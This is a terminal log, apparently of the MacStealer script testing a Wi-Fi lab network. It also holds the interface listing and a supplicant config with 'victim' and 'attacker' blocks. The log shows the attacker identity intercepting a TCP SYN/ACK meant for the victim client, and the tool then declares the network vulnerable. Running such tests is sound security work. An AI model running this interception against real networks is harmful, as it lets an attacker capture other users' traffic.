(venv) root@atis-Latitude-5420:/home/atis/Desktop/wifi/macstealer/research# python3 macstealer.py wlxa82948afa417
[13:17:09] Note: remember to disable Wi-Fi in your network manager so it doesn't interfere with this script
[13:17:09] Starting wpa_supplicant using: ../wpa_supplicant/wpa_supplicant -Dnl80211 -i wlxa82948afa417 -c client.conf -W
Successfully initialized wpa_supplicant
[13:17:09] Note: Victim and attacker are using the same password PSK{12345678}. In this scenario
[13:17:09]       the attack may be less damaging, see the Threat Model Discussion in README.md.
[13:17:09] Scanning for network and connecting as victim user...
wlxa82948afa417: CTRL-EVENT-DSCP-POLICY clear_all
wlxa82948afa417: Trying to associate with c4:e9:84:af:7a:60 (SSID='testnetwork' freq=2412 MHz)
wlxa82948afa417: CTRL-EVENT-STARTED-CHANNEL-SWITCH freq=2412 ht_enabled=1 ch_offset=1 ch_width=40 MHz cf1=2422 cf2=0
wlxa82948afa417: Associated with c4:e9:84:af:7a:60
wlxa82948afa417: CTRL-EVENT-SUBNET-STATUS-UPDATE status=0
wlxa82948afa417: WPA: Key negotiation completed with c4:e9:84:af:7a:60 [PTK=CCMP GTK=CCMP]
wlxa82948afa417: CTRL-EVENT-CONNECTED - Connection to c4:e9:84:af:7a:60 completed [id=0 id_str=victim]
[13:17:12] Sending DHCP discover with XID 1027266342
[13:17:13] Received DHCP offer for 192.168.1.101, sending DHCP request.
[13:17:13] Sending DHCP request with XID 1027266342
[13:17:13] DHCP ACK: Got IP address 192.168.1.101/a8:29:48:af:a4:17 with router at 192.168.1.1/c4:e9:84:af:7a:60.
[13:17:13] Transmitting challenge TCP SYN packet to 8.8.8.8:443
[13:17:13] Transmitted packet: <Ether  dst=c4:e9:84:af:7a:60 src=a8:29:48:af:a4:17 type=IPv4 |<IP  frag=0 proto=tcp src=192.168.1.101 dst=8.8.8.8 |<TCP  sport=4761 dport=https seq=135386999 |>>>
[13:17:13] Transmitted packet: <Ether  dst=c4:e9:84:af:7a:60 src=a8:29:48:af:a4:17 type=IPv4 |<IP  frag=0 proto=tcp src=192.168.1.101 dst=8.8.8.8 |<TCP  sport=4761 dport=https seq=135386999 |>>>
WARNING: No route found for IPv4 destination 192.168.1.1 (no default route?)
[13:17:13] c4:e9:84:af:7a:60: ARP: Ether / ARP who has 192.168.1.101 says 192.168.1.1 ==> Ether / ARP is at a8:29:48:af:a4:17 says 192.168.1.101 on lo
[13:17:13] Received TCP response: <Ether  dst=a8:29:48:af:a4:17 src=c4:e9:84:af:7a:60 type=IPv4 |<IP  version=4 ihl=5 tos=0x0 len=44 id=0 flags=DF frag=0 ttl=117 proto=tcp chksum=0x33af src=8.8.8.8 dst=192.168.1.101 |<TCP  sport=https dport=4761 seq=3705546 ack=135387000 dataofs=6 reserved=0 flags=SA window=65535 chksum=0x4749 urgptr=0 options=[('MSS', 1412)] |>>>
[13:17:13] Received TCP response: <Ether  dst=a8:29:48:af:a4:17 src=c4:e9:84:af:7a:60 type=IPv4 |<IP  version=4 ihl=5 tos=0x0 len=44 id=0 flags=DF frag=0 ttl=117 proto=tcp chksum=0x33af src=8.8.8.8 dst=192.168.1.101 |<TCP  sport=https dport=4761 seq=3705546 ack=135387000 dataofs=6 reserved=0 flags=SA window=65535 chksum=0x4749 urgptr=0 options=[('MSS', 1412)] |>>>
[13:17:13] Reconnecting as the attacker...
wlxa82948afa417: CTRL-EVENT-DISCONNECTED bssid=c4:e9:84:af:7a:60 reason=3 locally_generated=1
wlxa82948afa417: CTRL-EVENT-DSCP-POLICY clear_all
wlxa82948afa417: Trying to associate with c4:e9:84:af:7a:60 (SSID='testnetwork' freq=2412 MHz)
wlxa82948afa417: CTRL-EVENT-STARTED-CHANNEL-SWITCH freq=2412 ht_enabled=1 ch_offset=1 ch_width=40 MHz cf1=2422 cf2=0
wlxa82948afa417: Associated with c4:e9:84:af:7a:60
wlxa82948afa417: CTRL-EVENT-SUBNET-STATUS-UPDATE status=0
wlxa82948afa417: WPA: Key negotiation completed with c4:e9:84:af:7a:60 [PTK=CCMP GTK=CCMP]
wlxa82948afa417: CTRL-EVENT-CONNECTED - Connection to c4:e9:84:af:7a:60 completed [id=1 id_str=attacker]
[13:17:16] Listening for replies to the victim's TCP SYN request...
[13:17:16] Sending DHCP request with XID 1027266342
[13:17:16] DHCP ACK: Got IP address 192.168.1.101/a8:29:48:af:a4:17 with router at 192.168.1.1/c4:e9:84:af:7a:60.
[13:17:19] Received TCP response: <Ether  dst=a8:29:48:af:a4:17 src=c4:e9:84:af:7a:60 type=IPv4 |<IP  version=4 ihl=5 tos=0x0 len=44 id=0 flags=DF frag=0 ttl=117 proto=tcp chksum=0x33af src=8.8.8.8 dst=192.168.1.101 |<TCP  sport=https dport=4761 seq=3705546 ack=135387000 dataofs=6 reserved=0 flags=SA window=65535 chksum=0x4749 urgptr=0 options=[('MSS', 1412)] |>>>
[13:17:19] >>> Attacker PSK{12345678} intercepted TCP SYN/ACK reply to victim PSK{12345678} after 6.1s.
[13:17:19] >>> This means the network is vulnerable!
[13:17:19] Closing daemon and cleaning up ...
wlxa82948afa417: CTRL-EVENT-DISCONNECTED bssid=c4:e9:84:af:7a:60 reason=3 locally_generated=1
wlxa82948afa417: CTRL-EVENT-DSCP-POLICY clear_all
wlxa82948afa417: CTRL-EVENT-DSCP-POLICY clear_all
nl80211: deinit ifname=wlxa82948afa417 disabled_11b_rates=0
wlxa82948afa417: CTRL-EVENT-TERMINATING 
(venv) root@atis-Latitude-5420:/home/atis/Desktop/wifi/macstealer/research# 



SPEC:
~ » iw dev                                        130 ↵ atis@atis-Latitude-5420
phy#1
	Interface wlxa82948afa417
		ifindex 3
		wdev 0x100000001
		addr a8:29:48:af:a4:17
		type managed
		txpower 12.00 dBm
phy#0
	Interface wlp0s20f3
		ifindex 2
		wdev 0x1
		addr ec:63:d7:89:d5:5a
		type monitor
		channel 1 (2412 MHz), width: 20 MHz (no HT), center1: 2412 MHz
		multicast TXQ:
			qsz-byt	qsz-pkt	flows	drops	marks	overlmt	hashcoltx-bytes	tx-packets
			0	0	0	0	0	0	0	00
--------------------------------------------------------------------------------


supplicant : 
# Don't change this line, other MacStealer won't work
ctrl_interface=wpaspy_ctrl

network={
	# Don't change this line, other MacStealer won't work
	id_str="victim"

	# Network to test: fill in properties of the network to test
	ssid="testnetwork"
    psk="12345678"
}

network={
	# Don't change this line, other MacStealer won't work
	id_str="attacker"

	# Network to test: you can copy this from the previous network block
	ssid="testnetwork"
    psk="12345678"
}

